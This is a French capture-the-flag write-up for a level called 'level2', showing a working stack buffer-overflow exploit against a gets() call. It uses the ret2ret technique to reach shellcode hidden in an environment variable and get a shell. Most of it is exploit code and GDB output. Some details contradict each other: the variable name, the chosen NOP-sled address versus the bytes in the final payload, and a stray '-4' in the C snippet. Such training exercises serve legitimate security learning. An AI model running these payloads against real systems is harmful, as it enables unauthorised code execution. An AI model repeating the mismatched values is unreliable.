# Level2 : RET2RET

Première étape — tester le programme

```bash
$ ./level2
a
a
```

Le programme affiche l'entrée.

Démarrons-le dans GDB

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

`main` appelle une fonction `p`.

```gdb
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

On voit un appel à `gets()`. `gets()` est dangereux car il permet un débordement de tampon (buffer overflow).

---

### Trouver l'offset pour écraser EIP

On va utiliser un motif alphabétique :

```gdb
(gdb) r
Starting program: /home/user/level2/level2
AAAABBBBCCCC...zzz
AAAABBBBCCCC...zzz

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Les 4 octets de l'adresse correspondent à l'hex de 'U'. On remplace ces 4 'U' par BBBB pour vérifier si l'offset est correct.

Test de vérification :

```bash
$ python -c 'print "a"*80+"BBBB"' > /tmp/payload
(gdb) r < /tmp/payload
Starting program: /home/user/level2/level2 < /tmp/payload
...BBBB...

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

L'offset pour écraser EIP est donc **80 octets**.

---

### Contournement du contrôle anti-stack

Le binaire vérifie si l'adresse écrasée pointe vers la pile et quitte si c'est le cas :

```c
if ((check & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", check);-4
    exit(1);
}
```

```
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>
```

Pour contourner ça, on place la charge utile (payload) dans une variable d'environnement. Puis on utilise la technique **ret2ret** :

* écraser EIP par l'adresse d'une instruction `ret` (pour dépiler et passer à l'adresse suivante),
* placer ensuite l'adresse de la zone NOPsled présente dans l'environnement.

Exemple de génération du payload d'environnement (NOPsled + shellcode) :

```bash
export payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb...\xcd\x80"')
```

---

### Récupérer l'adresse de la variable d'environnement dans GDB

Mettre un breakpoint avant le `ret` final :

```gdb
(gdb) b *main+12
Breakpoint 1 at 0x804854b
(gdb) r
Starting program: ./level2
...
Breakpoint 1, 0x0804854b in main ()
```

Afficher `environ` pour trouver l'adresse :

```gdb
(gdb) x/200xs environ
...
0xbffffb9a: "exploit=\220\220\220\220..."
```

Ici l'adresse est `0xbffffb9a`.

Examiner la mémoire autour pour choisir une adresse dans le NOPsled :

```gdb
(gdb) x/200xg 0xbffffb9a
...
0xbffffc7c:	0x9090909090909090	0x9090909090909090
0xbffffc8c:	0x9090909090909090	0x9090909090909090
0xbffffc9c:	0x9090909090909090	0x9090909090909090
0xbffffcac:	0x9090909090909090	0x9090909090909090
0xbffffcbc:	0x9090909090909090	0x9090909090909090
0xbffffccc:	0x9090909090909090	0x9090909090909090
0xbffffcdc:	0x9090909090909090	0x9090909090909090
0xbffffcec:	0x9090909090909090	0x9090909090909090
0xbffffcfc:	0x9090909090909090	0x9090909090909090
0xbffffd0c:	0x9090909090909090	0x9090909090909090
0xbffffd1c:	0x9090909090909090	0x9090909090909090
0xbffffd2c:	0x9090909090909090	0x9090909090909090
...
```

Choisissons `0xbffffcec` (un emplacement dans le NOPsled).

---

### Trouver une adresse `ret`

On peut réutiliser l'instruction `ret` de `main` :

```gdb
(gdb) disas main
...
0x0804854b <+12>:	ret
```

Adresse : `0x0804854b`.

---

### Construire l'exploit

Formation du payload : `80 bytes` + `adress_ret` + `adress_env`

Exécution:

```bash
$ python -c 'print "a"*80+"\x4b\x85\x04\x08"+"\xec\xff\xff\xbf"' |  ./level2
...
whoami	
level3
```

et OP OP OP, on obtient un shell.

###  sources

``NOPsled``: https://www.youtube.com/watch?v=1S0aBV-Waeo&t=818s

``shellcode``: http://shell-storm.org/shellcode/files/shellcode-219.html

``code op``: http://ref.x86asm.net/coder.html


